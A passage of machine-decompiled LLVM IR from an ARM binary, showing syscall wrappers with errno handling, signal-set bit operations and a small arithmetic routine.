  %v0_1112c = load i32, i32* %r2.global-to-local, align 4
  %v1_1112c = add i32 %v0_1112c, 1
  store i32 %v1_1112c, i32* %r2.global-to-local, align 4
  %v1_11130 = inttoptr i32 %v1_11128 to i8*
  %v2_11130 = load i8, i8* %v1_11130, align 1
  %v2_11134 = icmp eq i8 %v2_11130, 0
  store i1 %v2_11134, i1* %cpsr_z.global-to-local, align 1
  %v3_11138 = inttoptr i32 %v1_1112c to i8*
  store i8 %v2_11130, i8* %v3_11138, align 1
  %v0_1113c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1113c, label %dec_label_pc_11140, label %dec_label_pc_11128

dec_label_pc_11140:                               ; preds = %dec_label_pc_11128, %dec_label_pc_11120
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 0 }
  uselistorder label %dec_label_pc_11128, { 1, 0 }
}

define i32 @function_11144(i32 %arg1) local_unnamed_addr {
dec_label_pc_11144:
  %stack_var_-12 = alloca i32, align 4
  %v2_1114c = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_1114c, i32* @r1, align 4
  %v0_11150 = call i32 @function_159ec()
  %v2_11154 = icmp eq i32 %v0_11150, 0
  %v4_11158 = load i32, i32* %stack_var_-12, align 4
  %storemerge = select i1 %v2_11154, i32 -1, i32 %v4_11158
  ret i32 %storemerge
}

define i32 @function_1116c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1116c:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1116c = load i32, i32* @r7, align 4
  store i32 %v3_1116c, i32* %stack_var_-8, align 4
  %v0_11178 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11178, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11178, -4095
  br i1 %tmp, label %dec_label_pc_11198, label %dec_label_pc_11188

dec_label_pc_11188:                               ; preds = %dec_label_pc_1116c
  %v0_11188 = call i32 @function_11008()
  %v0_1118c = load i32, i32* %r7.global-to-local, align 4
  %v1_1118c = sub i32 0, %v0_1118c
  %v2_11190 = inttoptr i32 %v0_11188 to i32*
  store i32 %v1_1118c, i32* %v2_11190, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11198.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11198

dec_label_pc_11198:                               ; preds = %dec_label_pc_1116c, %dec_label_pc_11188
  %v1_1119c = phi i32 [ %v0_11178, %dec_label_pc_1116c ], [ -1, %dec_label_pc_11188 ]
  %v2_11198 = phi i32 [ %v3_1116c, %dec_label_pc_1116c ], [ %v2_11198.pre, %dec_label_pc_11188 ]
  store i32 %v2_11198, i32* @r7, align 4
  ret i32 %v1_1119c

; uselistorder directives
  uselistorder i32 %v0_11178, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11198, { 1, 0 }
}

define i32 @function_111a4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_111a4:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_111a4 = load i32, i32* @r7, align 4
  store i32 %v3_111a4, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_111cc, label %dec_label_pc_111bc

dec_label_pc_111bc:                               ; preds = %dec_label_pc_111a4
  %v0_111bc = call i32 @function_11008()
  %v0_111c0 = load i32, i32* %r7.global-to-local, align 4
  %v1_111c0 = sub i32 0, %v0_111c0
  store i32 %v1_111c0, i32* @r3, align 4
  %v2_111c4 = inttoptr i32 %v0_111bc to i32*
  store i32 %v1_111c0, i32* %v2_111c4, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_111d0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_111cc

dec_label_pc_111cc:                               ; preds = %dec_label_pc_111a4, %dec_label_pc_111bc
  %v2_111d0 = phi i32 [ %v3_111a4, %dec_label_pc_111a4 ], [ %v2_111d0.pre, %dec_label_pc_111bc ]
  %v0_111cc = phi i32 [ %arg1, %dec_label_pc_111a4 ], [ -1, %dec_label_pc_111bc ]
  store i32 %v2_111d0, i32* @r7, align 4
  ret i32 %v0_111cc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_111cc, { 1, 0 }
}

define i32 @function_111dc(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_111dc:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_111dc = load i32, i32* @r7, align 4
  store i32 %v3_111dc, i32* %stack_var_-8, align 4
  %v0_111e8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_111e8, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_111e8, -4095
  br i1 %tmp, label %dec_label_pc_11208, label %dec_label_pc_111f8

dec_label_pc_111f8:                               ; preds = %dec_label_pc_111dc
  %v0_111f8 = call i32 @function_11008()
  %v0_111fc = load i32, i32* %r7.global-to-local, align 4
  %v1_111fc = sub i32 0, %v0_111fc
  %v2_11200 = inttoptr i32 %v0_111f8 to i32*
  store i32 %v1_111fc, i32* %v2_11200, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11208.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11208

dec_label_pc_11208:                               ; preds = %dec_label_pc_111dc, %dec_label_pc_111f8
  %v1_1120c = phi i32 [ %v0_111e8, %dec_label_pc_111dc ], [ -1, %dec_label_pc_111f8 ]
  %v2_11208 = phi i32 [ %v3_111dc, %dec_label_pc_111dc ], [ %v2_11208.pre, %dec_label_pc_111f8 ]
  store i32 %v2_11208, i32* @r7, align 4
  ret i32 %v1_1120c

; uselistorder directives
  uselistorder i32 %v0_111e8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11208, { 1, 0 }
}

define i32 @function_11214(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_11214:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_11248, label %dec_label_pc_11238

dec_label_pc_11238:                               ; preds = %dec_label_pc_11214
  %v0_11238 = call i32 @function_11008()
  %v0_1123c = load i32, i32* %r4.global-to-local, align 4
  %v1_1123c = sub i32 0, %v0_1123c
  %v2_11240 = inttoptr i32 %v0_11238 to i32*
  store i32 %v1_1123c, i32* %v2_11240, align 4
  br label %dec_label_pc_11248

dec_label_pc_11248:                               ; preds = %dec_label_pc_11214, %dec_label_pc_11238
  %v1_11250 = phi i32 [ %arg1, %dec_label_pc_11214 ], [ -1, %dec_label_pc_11238 ]
  ret i32 %v1_11250

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11248, { 1, 0 }
}

define i32 @function_11258(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11258:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11258 = load i32, i32* @r7, align 4
  store i32 %v3_11258, i32* %stack_var_-8, align 4
  %v0_11264 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11264, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11264, -4095
  br i1 %tmp, label %dec_label_pc_11284, label %dec_label_pc_11274

dec_label_pc_11274:                               ; preds = %dec_label_pc_11258
  %v0_11274 = call i32 @function_11008()
  %v0_11278 = load i32, i32* %r7.global-to-local, align 4
  %v1_11278 = sub i32 0, %v0_11278
  %v2_1127c = inttoptr i32 %v0_11274 to i32*
  store i32 %v1_11278, i32* %v2_1127c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11284.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11284

dec_label_pc_11284:                               ; preds = %dec_label_pc_11258, %dec_label_pc_11274
  %v1_11288 = phi i32 [ %v0_11264, %dec_label_pc_11258 ], [ -1, %dec_label_pc_11274 ]
  %v2_11284 = phi i32 [ %v3_11258, %dec_label_pc_11258 ], [ %v2_11284.pre, %dec_label_pc_11274 ]
  store i32 %v2_11284, i32* @r7, align 4
  ret i32 %v1_11288

; uselistorder directives
  uselistorder i32 %v0_11264, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11284, { 1, 0 }
}

define i32 @function_1128c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1128c:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1128c = load i32, i32* @r7, align 4
  store i32 %v3_1128c, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_112b4, label %dec_label_pc_112a4

dec_label_pc_112a4:                               ; preds = %dec_label_pc_1128c
  %v0_112a4 = call i32 @function_11008()
  %v0_112a8 = load i32, i32* %r7.global-to-local, align 4
  %v1_112a8 = sub i32 0, %v0_112a8
  %v2_112ac = inttoptr i32 %v0_112a4 to i32*
  store i32 %v1_112a8, i32* %v2_112ac, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_112b8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_112b4

dec_label_pc_112b4:                               ; preds = %dec_label_pc_1128c, %dec_label_pc_112a4
  %v2_112b8 = phi i32 [ %v3_1128c, %dec_label_pc_1128c ], [ %v2_112b8.pre, %dec_label_pc_112a4 ]
  %v0_112b4 = phi i32 [ %arg1, %dec_label_pc_1128c ], [ -1, %dec_label_pc_112a4 ]
  store i32 %v2_112b8, i32* @r7, align 4
  ret i32 %v0_112b4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_112b4, { 1, 0 }
}

define i32 @function_112c4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_112c4:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_112c4 = load i32, i32* @r4, align 4
  store i32 %v3_112c4, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_112f4, label %dec_label_pc_112e4

dec_label_pc_112e4:                               ; preds = %dec_label_pc_112c4
  %v0_112e4 = call i32 @function_11008()
  %v0_112e8 = load i32, i32* %r4.global-to-local, align 4
  %v1_112e8 = sub i32 0, %v0_112e8
  %v2_112ec = inttoptr i32 %v0_112e4 to i32*
  store i32 %v1_112e8, i32* %v2_112ec, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_112f8.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_112f4

dec_label_pc_112f4:                               ; preds = %dec_label_pc_112c4, %dec_label_pc_112e4
  %v2_112f8 = phi i32 [ %v3_112c4, %dec_label_pc_112c4 ], [ %v2_112f8.pre, %dec_label_pc_112e4 ]
  %v0_112f4 = phi i32 [ %arg1, %dec_label_pc_112c4 ], [ -1, %dec_label_pc_112e4 ]
  store i32 %v2_112f8, i32* @r4, align 4
  ret i32 %v0_112f4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_112f4, { 1, 0 }
}

define i32 @function_11300(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_11300:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11300 = load i32, i32* @r7, align 4
  store i32 %v3_11300, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_11328, label %dec_label_pc_11318

dec_label_pc_11318:                               ; preds = %dec_label_pc_11300
  %v0_11318 = call i32 @function_11008()
  %v0_1131c = load i32, i32* %r7.global-to-local, align 4
  %v1_1131c = sub i32 0, %v0_1131c
  store i32 %v1_1131c, i32* @r3, align 4
  %v2_11320 = inttoptr i32 %v0_11318 to i32*
  store i32 %v1_1131c, i32* %v2_11320, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_1132c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11328

dec_label_pc_11328:                               ; preds = %dec_label_pc_11300, %dec_label_pc_11318
  %v2_1132c = phi i32 [ %v3_11300, %dec_label_pc_11300 ], [ %v2_1132c.pre, %dec_label_pc_11318 ]
  %v0_11328 = phi i32 [ %arg1, %dec_label_pc_11300 ], [ -1, %dec_label_pc_11318 ]
  store i32 %v2_1132c, i32* @r7, align 4
  ret i32 %v0_11328

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11328, { 1, 0 }
}

define i32 @function_11338(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_11338:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_11338 = load i32, i32* @r4, align 4
  store i32 %v3_11338, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_11368, label %dec_label_pc_11358

dec_label_pc_11358:                               ; preds = %dec_label_pc_11338
  %v0_11358 = call i32 @function_11008()
  %v0_1135c = load i32, i32* %r4.global-to-local, align 4
  %v1_1135c = sub i32 0, %v0_1135c
  %v2_11360 = inttoptr i32 %v0_11358 to i32*
  store i32 %v1_1135c, i32* %v2_11360, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_1136c.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_11368

dec_label_pc_11368:                               ; preds = %dec_label_pc_11338, %dec_label_pc_11358
  %v2_1136c = phi i32 [ %v3_11338, %dec_label_pc_11338 ], [ %v2_1136c.pre, %dec_label_pc_11358 ]
  %v0_11368 = phi i32 [ %arg1, %dec_label_pc_11338 ], [ -1, %dec_label_pc_11358 ]
  store i32 %v2_1136c, i32* @r4, align 4
  ret i32 %v0_11368

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11368, { 1, 0 }
}

define i32 @function_11378(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_11378:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_113ac, label %dec_label_pc_1139c

dec_label_pc_1139c:                               ; preds = %dec_label_pc_11378
  %v0_1139c = call i32 @function_11008()
  %v0_113a0 = load i32, i32* %r4.global-to-local, align 4
  %v1_113a0 = sub i32 0, %v0_113a0
  store i32 %v1_113a0, i32* @r3, align 4
  %v2_113a4 = inttoptr i32 %v0_1139c to i32*
  store i32 %v1_113a0, i32* %v2_113a4, align 4
  br label %dec_label_pc_113ac

dec_label_pc_113ac:                               ; preds = %dec_label_pc_11378, %dec_label_pc_1139c
  %v1_113b4 = phi i32 [ %arg1, %dec_label_pc_11378 ], [ -1, %dec_label_pc_1139c ]
  ret i32 %v1_113b4

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_113ac, { 1, 0 }
}

define i32 @function_113bc(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_113bc:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_113bc = load i32, i32* @r7, align 4
  store i32 %v3_113bc, i32* %stack_var_-8, align 4
  %v0_113c8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_113c8, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_113c8, -4095
  br i1 %tmp, label %dec_label_pc_113e8, label %dec_label_pc_113d8

dec_label_pc_113d8:                               ; preds = %dec_label_pc_113bc
  %v0_113d8 = call i32 @function_11008()
  %v0_113dc = load i32, i32* %r7.global-to-local, align 4
  %v1_113dc = sub i32 0, %v0_113dc
  store i32 %v1_113dc, i32* @r3, align 4
  %v2_113e0 = inttoptr i32 %v0_113d8 to i32*
  store i32 %v1_113dc, i32* %v2_113e0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_113e8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_113e8

dec_label_pc_113e8:                               ; preds = %dec_label_pc_113bc, %dec_label_pc_113d8
  %v1_113ec = phi i32 [ %v0_113c8, %dec_label_pc_113bc ], [ -1, %dec_label_pc_113d8 ]
  %v2_113e8 = phi i32 [ %v3_113bc, %dec_label_pc_113bc ], [ %v2_113e8.pre, %dec_label_pc_113d8 ]
  store i32 %v2_113e8, i32* @r7, align 4
  ret i32 %v1_113ec

; uselistorder directives
  uselistorder i32 %v0_113c8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_113e8, { 1, 0 }
}

define i32 @function_113f4(i32 %arg1) local_unnamed_addr {
dec_label_pc_113f4:
  store i32 %arg1, i32* @r0, align 4
  %v3_113f4 = load i32, i32* @r4, align 4
  %v0_113fc = call i32 @function_1084c()
  %v2_11404 = call i32 @function_109ac(i32 %v0_113fc, i32 %arg1)
  store i32 %v3_113f4, i32* @r4, align 4
  ret i32 %v2_11404

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_109ac, { 0, 4, 3, 2, 1 }
  uselistorder i32 ()* @function_1084c, { 0, 3, 2, 1 }
}

define i32 @function_11410(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11410:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r1, align 4
  %tmp4 = icmp slt i32 %arg1, 1
  br i1 %tmp4, label %dec_label_pc_11428, label %dec_label_pc_11420

dec_label_pc_11420:                               ; preds = %dec_label_pc_11410
  %v7_11424 = icmp slt i32 %arg1, 65
  br i1 %v7_11424, label %dec_label_pc_1143c, label %dec_label_pc_11428

dec_label_pc_11428:                               ; preds = %dec_label_pc_11420, %dec_label_pc_11410
  %v0_11428 = call i32 @function_11008()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_11434 = inttoptr i32 %v0_11428 to i32*
  store i32 22, i32* %v2_11434, align 4
  %v0_11444.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11444

dec_label_pc_1143c:                               ; preds = %dec_label_pc_11420
  %v0_1143c = call i32 @function_11544()
  store i32 %v0_1143c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11444

dec_label_pc_11444:                               ; preds = %dec_label_pc_11428, %dec_label_pc_1143c
  %v0_11444 = phi i32 [ %v0_11444.pre, %dec_label_pc_11428 ], [ %v0_1143c, %dec_label_pc_1143c ]
  ret i32 %v0_11444

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11444, { 1, 0 }
}

define i32 @function_11454(i32* %arg1) local_unnamed_addr {
dec_label_pc_11454:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_1145c = add i32 %tmp, 4
  %v3_1145c = inttoptr i32 %v2_1145c to i32*
  store i32 0, i32* %v3_1145c, align 4
  %v1_11460 = load i32, i32* %r3.global-to-local, align 4
  %v2_11460 = inttoptr i32 %v1_11460 to i32*
  store i32 0, i32* %v2_11460, align 4
  ret i32 0
}

define i32 @function_11468(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11468:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_11468 = load i32, i32* @r4, align 4
  store i32 %v3_11468, i32* %stack_var_-16, align 4
  %v6_11468 = load i32, i32* @r5, align 4
  %v9_11468 = load i32, i32* @r6, align 4
  %v7_11470 = icmp eq i32 %arg2, -1
  br i1 %v7_11470, label %.thread4, label %bb

.thread4:                                         ; preds = %dec_label_pc_11468
  br label %.thread16

bb:                                               ; preds = %dec_label_pc_11468
  %v2_11478 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %arg1, i32* @r5, align 4
  %tmp28 = icmp slt i32 %arg1, 1
  br i1 %tmp28, label %.thread16, label %dec_label_pc_11494

.thread16:                                        ; preds = %bb, %.thread4
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1149c

dec_label_pc_11494:                               ; preds = %bb
  store i32 0, i32* %r2.global-to-local, align 4
  %v7_11498 = icmp slt i32 %arg1, 65
  br i1 %v7_11498, label %dec_label_pc_114b0, label %dec_label_pc_1149c

dec_label_pc_1149c:                               ; preds = %.thread16, %dec_label_pc_11494
  %v0_1149c = call i32 @function_11008()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_114a8 = inttoptr i32 %v0_1149c to i32*
  store i32 22, i32* %v2_114a8, align 4
  %v0_11508.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb33

dec_label_pc_114b0:                               ; preds = %dec_label_pc_11494
  %v2_114b0 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_114b0, i32* @r4, align 4
  store i32 %arg1, i32* @r1, align 4
  %v2_114b8 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_114b8, i32* @r0, align 4
  store i32 %arg2, i32* %stack_var_-36, align 4
  store i32 0, i32* %stack_var_-24, align 4
  %v0_114c8 = call i32 @function_11544()
  %v0_114d0 = load i32, i32* @r5, align 4
  %v2_114d8 = call i32 @function_11520(i32 ptrtoint (i32* @global_var_208a4.322 to i32), i32 %v0_114d0)
  store i32 %v2_11478, i32* %r2.global-to-local, align 4
  %v0_114f0 = load i32, i32* @r5, align 4
  %v3_114f8 = call i32 @function_13954(i32 %v0_114f0, i32 %v2_114b0, i32 %v2_11478)
  %v1_114fc = icmp slt i32 %v3_114f8, 0
  br i1 %v1_114fc, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_114b0
  %v5_11500 = load i32, i32* %stack_var_-56, align 4
  store i32 %v5_11500, i32* %r2.global-to-local, align 4
  br label %bb33

bb32:                                             ; preds = %dec_label_pc_114b0
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %bb33

bb33:                                             ; preds = %bb31, %dec_label_pc_1149c, %bb32
  %v0_11508 = phi i32 [ %v5_11500, %bb31 ], [ %v0_11508.pre, %dec_label_pc_1149c ], [ -1, %bb32 ]
  %v2_11510 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_11510, i32* @r4, align 4
  store i32 %v6_11468, i32* @r5, align 4
  store i32 %v9_11468, i32* @r6, align 4
  ret i32 %v0_11508

; uselistorder directives
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 ()* @function_11544, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 3, 0, 2 }
  uselistorder label %bb33, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1149c, { 1, 0 }
}

define i32 @function_11520(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11520:
  %v1_11520 = add i32 %arg2, -1
  %v3_11524 = udiv i32 %v1_11520, 32
  %v4_11528 = mul nuw nsw i32 %v3_11524, 4
  %v5_11528 = add i32 %v4_11528, %arg1
  %v6_11528 = inttoptr i32 %v5_11528 to i32*
  %v7_11528 = load i32, i32* %v6_11528, align 4
  %v1_1152c = urem i32 %v1_11520, 32
  %v7_11534 = shl i32 1, %v1_1152c
  %v8_11534 = and i32 %v7_11528, %v7_11534
  %v10_11534 = icmp ne i32 %v8_11534, 0
  %. = zext i1 %v10_11534 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_11520, { 1, 0 }
}

define i32 @function_11544() local_unnamed_addr {
dec_label_pc_11544:
  %v0_11544 = load i32, i32* @r1, align 4
  %v1_11544 = add i32 %v0_11544, -1
  %v3_11548 = udiv i32 %v1_11544, 32
  %v0_1154c = load i32, i32* @r0, align 4
  %v4_1154c = mul nuw nsw i32 %v3_11548, 4
  %v5_1154c = add i32 %v0_1154c, %v4_1154c
  %v6_1154c = inttoptr i32 %v5_1154c to i32*
  %v7_1154c = load i32, i32* %v6_1154c, align 4
  %v1_11550 = urem i32 %v1_11544, 32
  %v7_11558 = shl i32 1, %v1_11550
  %v8_11558 = or i32 %v7_1154c, %v7_11558
  store i32 %v8_11558, i32* %v6_1154c, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_11544, { 1, 0 }
}

define i32 @function_11568(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11568:
  %v1_11568 = add i32 %arg2, -1
  %v3_1156c = udiv i32 %v1_11568, 32
  %v4_11570 = mul nuw nsw i32 %v3_1156c, 4
  %v5_11570 = add i32 %v4_11570, %arg1
  %v6_11570 = inttoptr i32 %v5_11570 to i32*
  %v7_11570 = load i32, i32* %v6_11570, align 4
  %v1_11574 = urem i32 %v1_11568, 32
  %tmp = shl i32 -1, %v1_11574
  %v8_1157c = add i32 %tmp, -1
  %v9_1157c = and i32 %v7_11570, %v8_1157c
  store i32 %v9_1157c, i32* %v6_11570, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_11568, { 1, 0 }
}

define i32 @function_1158c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1158c:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v3_1158c = udiv i32 %arg1, 256
  store i32 %v3_1158c, i32* %r1.global-to-local, align 4
  %v2_11590 = icmp ugt i32 %arg1, 16777215
  store i32 %arg1, i32* %ip.global-to-local, align 4
  br i1 %v2_11590, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_1158c
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_1158c, %bb
  %v0_1159c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_11590, i32 %v0_1159c)
  %v0_115a0 = load i32, i32* %r1.global-to-local, align 4
  %v1_115a0 = add i32 %v0_115a0, 1048320
  %v3_115a4 = udiv i32 %v1_115a0, 65536
  %v1_115a8 = and i32 %v3_115a4, 8
  %v6_115ac = shl i32 %v0_115a0, %v1_115a8
  %v1_115b0 = add i32 %v6_115ac, 520192
  %v3_115b4 = udiv i32 %v1_115b0, 65536
  %v1_115b8 = and i32 %v3_115b4, 4
  %v6_115bc = shl i32 %v6_115ac, %v1_115b8
  %v1_115c0 = add i32 %v6_115bc, 245760
  %v3_115c4 = udiv i32 %v1_115c0, 65536
  %v1_115c8 = and i32 %v3_115c4, 2
  %v6_115cc = shl i32 %v6_115bc, %v1_115c8
  store i32 %v6_115cc, i32* %r1.global-to-local, align 4
  %v1_115d0 = sub nsw i32 13, %v1_115a8
  %v2_115d4 = sub nsw i32 %v1_115d0, %v1_115b8
  %v3_115d8 = udiv i32 %v6_115cc, 32768
  %v4_115d8 = sub nuw nsw i32 -1, %v3_115d8
  %v4_115dc = udiv i32 %v6_115cc, 16384
  %v5_115dc = and i32 %v4_115dc, %v4_115d8
  %v2_115e0 = sub nsw i32 %v2_115d4, %v1_115c8
  %v2_115e4 = add nsw i32 %v2_115e0, %v5_115dc
  %v1_115e8 = add nsw i32 %v2_115e4, 6
  %v0_115ec = load i32, i32* %ip.global-to-local, align 4
  %v6_115ec = lshr i32 %v0_115ec, %v1_115e8
  %v3_115f0 = mul nsw i32 %v2_115e4, 4
  %v1_115f4 = add nsw i32 %v3_115f0, 32
  %v1_115f8 = urem i32 %v6_115ec, 4
  %v2_115fc = or i32 %v1_115f8, %v1_115f4
  ret i32 %v2_115fc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @function_11604(i32 %arg1) local_unnamed_addr {
dec_label_pc_11604:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_11604 = load i32, i32* @r4, align 4
  %v6_11604 = load i32, i32* @r5, align 4
